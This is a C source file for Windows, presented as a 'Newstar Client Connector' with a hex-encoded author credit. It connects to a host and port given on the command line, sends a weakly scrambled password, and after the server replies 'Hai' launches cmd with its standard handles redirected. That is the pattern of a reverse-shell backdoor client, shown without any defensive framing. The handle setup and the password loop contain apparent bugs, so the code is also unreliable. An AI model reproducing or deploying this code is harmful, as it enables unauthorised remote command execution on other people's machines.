#include <stdio.h>
#include <winsock2.h>
#pragma comment(linker,"-lws2_32")

const char CPY[] = "\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x42\x75\x6c\x6c"
"\x20\x4d\x6f\x6f\x73\x65\x20\x28\x46\x6f\x72\x6d\x65\x72\x6c\x79\x20\x41\x54\x4d"
"\x4c\x29\x20\x75\x6e\x64\x65\x72\x20\x74\x68\x65\x20\x47\x50\x4c\x2e";

int main(int argc, char *argv[])
{
	if(argc != 4) {
		printf("%s\nNewstar Client Connector:\nUSAGE: %s [Address] [Port] [Password]\n\t[Address] = Address to the server.\n\t[Port] = Port to the server.\n\t[Password] = Secure password to connect to server.\n", CPY, argv[0]);
		return 1;
	}
	printf("Attempting Connection...\n");
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	struct sockaddr_in sa;
	int s, err;

	WSADATA HWSAdata;
	WSAStartup(MAKEWORD(2,2), &HWSAdata);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	sa.sin_family = AF_INET;
	sa.sin_port = htons((short)atoi(argv[2]));
	sa.sin_addr.s_addr = inet_addr(argv[1]);

	if((err = connect(s, (SOCKADDR*)&sa, sizeof(sa)))==SOCKET_ERROR) {
		printf("Error: Could not connect to address specified.\n");
		WSACleanup();
		return 1;
	}
	printf("Connected to server!\n");
	printf("Crafting encrypted version of password...\n");
	int i = -1, slide = 0;
	char buffer[200];
	memset(buffer,'\0',sizeof(buffer));
	strcpy(buffer,argv[3]);
	for(slide = 0; buffer[i++] != '\0';) buffer[i] += ++slide;

	printf("Sending password buffer...\n");
	if((err = send(s,buffer,sizeof(buffer),0)) == SOCKET_ERROR) {
		printf("Error: Could not send password buffer.\n");
		closesocket(s);
		WSACleanup();
		return 1;
	}
	printf("Password buffer sent successfully!\n");
	printf("Awaiting confirmation.\n");
	memset(buffer,'\0',sizeof(buffer));
	recv(s,buffer,sizeof(buffer),0);
	if(strstr(buffer,"Hai")==NULL) {
		printf("The password was not accepted.\n");
		closesocket(s);
		WSACleanup();
		return 1;
	}
	printf("The server has authenticated your password, you're in.\n");

	si.cb = sizeof(si);
	si.wShowWindow = SW_SHOW;
	si.dwFlags = STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *) 2;

	si.lpDesktop = si.lpTitle = (char *) 0x0000;
	si.lpReserved2 = NULL;
	CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, (STARTUPINFO*)&si, &pi);
}
